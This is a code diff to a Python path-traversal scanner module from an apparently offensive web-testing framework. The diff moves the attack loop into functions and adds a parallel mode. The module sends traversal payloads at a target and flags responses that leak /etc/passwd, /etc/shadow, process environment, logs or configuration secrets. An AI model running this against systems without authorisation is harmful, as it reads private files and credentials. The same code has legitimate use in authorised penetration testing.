@@ -16,18 +16,21 @@ import sys
 import urllib
 import requests
 import time
+from multiprocessing import Pool, TimeoutError
+from core.methods.multiproc import listsplit, file2list
+from core.variables import processes
 from core.Core.colors import O, GR, R, G, B, C, W, color
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 global active0
-loggy = []
-enviro = []
-fud = []
-generic = []
-cnfy = []
-gotcha = []
+#loggy = []
+#enviro = []
+#fud = []
+#generic = []
+#cnfy = []
+#gotcha = []
 active0 = False
 
 query = [False]
@@ -38,9 +41,127 @@ info = "This module tries to find path traversal vulnerabilities on the target w
 searchinfo = "Path Traversal Finder"
 properties = {}
 
-def check0x00(website0, gen_headers):
+def atckpre(evasion, filepath, owebsite, plist):
+    go = []
+    ge = []
+    lo = []
+    en = []
+    fu = []
+    cn = []
+    for i in plist:
+        paths = atck(evasion, filepath, owebsite, i)
+        go += paths[0]
+        ge += paths[1]
+        lo += paths[2]
+        en += paths[3]
+        fu += paths[4]
+        cn += paths[5]
+    return (go, ge, lo, en, fu, cn)
+
+
+def atck(evasion, filepath, owebsite, line):
+    got = []
+    gen = []
+    log = []
+    env = []
+    fu2 = []
+    cnf = []
+
+    c = line.strip('\n')
+    if evasion and filepath != "":
+        c = c.replace("etc/shadow", filepath)
+    if not c.startswith('/'):
+        website = owebsite + '/' + c
+    else:
+        website = owebsite + c
+    #status_code = 500
+    print(B+' [+] Testing Url : '+C+website)
+    req = requests.get(website, headers=gen_headers, allow_redirects=False, timeout=7, verify=False)
+    content = str(req.content)
+
+    if str(req.status_code).startswith('2') or req.status_code == 302:
+        # same stuff as in _lfi module
+        if ("[<a href='function.main'>function.main</a>" not in content
+                and "[<a href='function.include'>function.include</a>" not in content
+                and ("Failed opening" not in content and "for inclusion" not in content)
+                and "failed to open stream:" not in content
+                and "open_basedir restriction in effect" not in content
+                and ("root:" in content or ("sbin" in content and "nologin" in content)
+            or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content or 'root:x:' in content
+            or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
+            or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
+            or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
+            or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
+            or 'daemon:x:' in content or 'bin:x:' in content or 'mail:x:' in content or 'user:x:' in content
+            or ("error]" in content and "[client" in content and "log" in website)
+            or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
+            or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
+                and "/proc/self/status" in website))):
+            print(G+" [+] '{}' ".format(str(website))+O+"[Vulnerable]")
+            print(W+color.BOLD+' [+] Content Received : ')
+            print(W+content)
+            website = str(website)
+            got.append(website)
+
+            if("log" in website):
+                log.append(website)
+            elif("/proc/self/environ" in website):
+                env.append(website)
+            elif("/proc/self/fd" in website):
+                fu2.append(website)
+            elif(".cnf" in website or ".conf" in website or ".ini" in website):
+                cnf.append(website)
+            else:
+                gen.append(website)
+        elif query:
+            #print("query, {}, {}".format(siteinput[0], website))
+            origrq = requests.get(siteinput[0])
+            con2 = origrq.content
+            con = req.content
+            #print("{}\n\n\n {}".format(content,con2))
+            if con != con2:
+                print(G+" [+] '{}' ".format(str(website))+O+"[Vulnerable]")
+                print(W+color.BOLD+' [+] Content Received : ')
+                print(W+content)
+
+                website = str(website)
+                got.append(website)
+
+                if("log" in website):
+                    log.append(website)
+                elif("/proc/self/environ" in website):
+                    env.append(website)
+                elif("/proc/self/fd" in website):
+                    fu2.append(website)
+                elif(".cnf" in website or ".conf" in website or ".ini" in website):
+                    cnf.append(website)
+                else:
+                    gen.append(website)
+            else:
+                print(R+" [-] '"+str(website)+"'"+O+" [Not vulnerable]")
+        else:
+            print(R+" [-] '"+str(website)+"'"+O+" [Not vulnerable]")
+    elif req.status_code == 404:
+        pass
+    elif req.status_code == 403:
+        print(G+" [+] '{}' ".format(str(website))+O+"[Vulnerable]")
+        print(" [!] 403 - Forbidden")
+    elif req.status_code == 401:
+        print(R+" [-] 401 - Missing authentication.\n")
+    else:
+        print(R+" [-] Problem connecting to the website...\n")
+    return (got, gen, log, env, fu2, cnf)
+
+
+def check0x00(website0, gen_headers, parallel):
     #print(query)
     #print(siteinput)
+    loggy = []
+    enviro = []
+    fud = []
+    generic = []
+    cnfy = []
+    gotcha = []
     ev = input(O+"\n [?] Perform Evasion Attack? (specific file ; enter for no) :> ")
     evasion = ev != ""
     if not evasion:
@@ -62,91 +183,29 @@ def check0x00(website0, gen_headers):
         owebsite = website0
 
     print("")
-    for line in open(fi):
-        c = line.strip('\n')
-        if evasion and filepath != "":
-            c = c.replace("etc/shadow", filepath)
-        if not c.startswith('/'):
-            website = owebsite + '/' + c
-        else:
-            website = owebsite + c
-        #status_code = 500
-        print(B+' [+] Testing Url : '+C+website)
-        req = requests.get(website, headers=gen_headers, allow_redirects=False, timeout=7, verify=False)
-        content = str(req.content)
-
-        if str(req.status_code).startswith('2') or req.status_code == 302:
-            # same stuff as in _lfi module
-            if ("[<a href='function.main'>function.main</a>" not in content
-                    and "[<a href='function.include'>function.include</a>" not in content
-                    and ("Failed opening" not in content and "for inclusion" not in content)
-                    and "failed to open stream:" not in content
-                    and "open_basedir restriction in effect" not in content
-                    and ("root:" in content or ("sbin" in content and "nologin" in content)
-                or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content or 'root:x:' in content
-                or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
-                or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
-                or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
-                or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
-                or 'daemon:x:' in content or 'bin:x:' in content or 'mail:x:' in content or 'user:x:' in content
-                or ("error]" in content and "[client" in content and "log" in website)
-                or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
-                or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
-                    and "/proc/self/status" in website))):
-                print(G+" [+] '{}' ".format(str(website))+O+"[Vulnerable]")
-                print(W+color.BOLD+' [+] Content Received : ')
-                print(W+content)
-                website = str(website)
-                gotcha.append(website)
-
-                if("log" in website):
-                    loggy.append(website)
-                elif("/proc/self/environ" in website):
-                    enviro.append(website)
-                elif("/proc/self/fd" in website):
-                    fud.append(website)
-                elif(".cnf" in website or ".conf" in website or ".ini" in website):
-                    cnfy.append(website)
-                else:
-                    generic.append(website)
-            elif query:
-                #print("query, {}, {}".format(siteinput[0], website))
-                origrq = requests.get(siteinput[0])
-                con2 = origrq.content
-                con = req.content
-                #print("{}\n\n\n {}".format(content,con2))
-                if con != con2:
-                    print(G+" [+] '{}' ".format(str(website))+O+"[Vulnerable]")
-                    print(W+color.BOLD+' [+] Content Received : ')
-                    print(W+content)
-
-                    website = str(website)
-                    gotcha.append(website)
-
-                    if("log" in website):
-                        loggy.append(website)
-                    elif("/proc/self/environ" in website):
-                        enviro.append(website)
-                    elif("/proc/self/fd" in website):
-                        fud.append(website)
-                    elif(".cnf" in website or ".conf" in website or ".ini" in website):
-                        cnfy.append(website)
-                    else:
-                        generic.append(website)
-                else:
-                    print(R+" [-] '"+str(website)+"'"+O+" [Not vulnerable]")
-            else:
-                print(R+" [-] '"+str(website)+"'"+O+" [Not vulnerable]")
-        elif req.status_code == 404:
-            pass
-        elif req.status_code == 403:
-            print(G+" [+] '{}' ".format(str(website))+O+"[Vulnerable]")
-            print(" [!] 403 - Forbidden")
-        elif req.status_code == 401:
-            print(R+" [-] 401 - Missing authentication.\n")
-        else:
-            print(R+" [-] Problem connecting to the website...\n")
-            
+    if not parallel:
+        for line in open(fi):
+            paths = atck(evasion, filepath, owebsite, line)
+            gotcha += paths[0]
+            generic += paths[1]
+            loggy += paths[2]
+            enviro += paths[3]
+            fud += paths[4]
+            cnfy += paths[5]
+    else:
+        pathlist = file2list(fi)
+        pthlst = listsplit(pathlist, round(len(pathlist)/processes))
+        with Pool(processes=processes) as pool:
+            res = [pool.apply_async(atckpre, args=(evasion,filepath,owebsite,l,)) for l in pthlst]
+            #res1 = pool.apply_async(portloop, )
+            for i in res:
+                paths = i.get()
+                gotcha += paths[0]
+                generic += paths[1]
+                loggy += paths[2]
+                enviro += paths[3]
+                fud += paths[4]
+                cnfy += paths[5]
     print(G+"\n [+] Retrieved %s interesting paths...\n" % str(len(gotcha)))
     time.sleep(0.5)
 
@@ -155,6 +214,7 @@ def check0x00(website0, gen_headers):
     printOut0x00("/proc/self/fd",fud)
     printOut0x00("Configuration", cnfy)
     printOut0x00("Generic",generic)
+
 
 def printOut0x00(pathlist,stack):
 
@@ -191,7 +251,9 @@ def pathtrav(web):
                   
     try:
         print(GR+' [!] Input the directory to be used... Final Url will be like '+O+'"http://site.com/sensitive"')
-        param = input(O+' [#] Enter directory asssociated (eg. /sensitive) [Enter for None] :> ')
+        param = input(O+' [!] Enter directory asssociated (eg. /sensitive) [Enter for None] :> ')
+        pa = input("\n [?] Parallelise Attack? (enter if not) :> ")
+        parallel = pa is not ""
         input_cookie = input("\n [#] Got cookies? [Enter if none] :> ")
         global gen_headers
         gen_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
@@ -208,6 +270,7 @@ def pathtrav(web):
             web00 = web + param
         else:
             web00 = web + '/' + param
+
         input_query = input("\n [#] Query Attack? [Enter if not] :> ")
         #print(input_query)
         if input_query != "":
@@ -215,7 +278,8 @@ def pathtrav(web):
             param = input(" [#] Enter parameter :> ")
             web00 = web00 + "?" + param + "="
         siteinput[0] = web00
-        check0x00(web00, gen_headers)
+
+        check0x00(web00, gen_headers, parallel)
 
     except KeyboardInterrupt:
         print(R+' [-] User Interruption!')
